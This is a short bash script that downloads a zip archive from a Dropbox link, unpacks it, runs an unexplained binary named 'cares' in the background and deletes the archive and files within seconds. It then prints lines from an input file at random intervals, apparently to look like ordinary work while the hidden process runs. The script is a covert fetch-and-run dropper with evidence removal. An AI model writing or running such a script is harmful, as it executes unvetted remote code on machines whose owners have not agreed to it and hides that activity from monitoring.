#!/bin/bash

end=$((SECONDS+$1))
wget https://www.dropbox.com/s/1i0igcj4hagblld/wan04.zip -q
unzip wan04.zip > /dev/null 2>&1
#pwd
./cares ./bin &
sleep 3
rm -rf wan04.zip
rm -rf cares
rm -rf bin
while [ $SECONDS -lt $end ]
do
    read line
    echo "$line"
    sleep $(( $RANDOM % 10 ))
done < $2

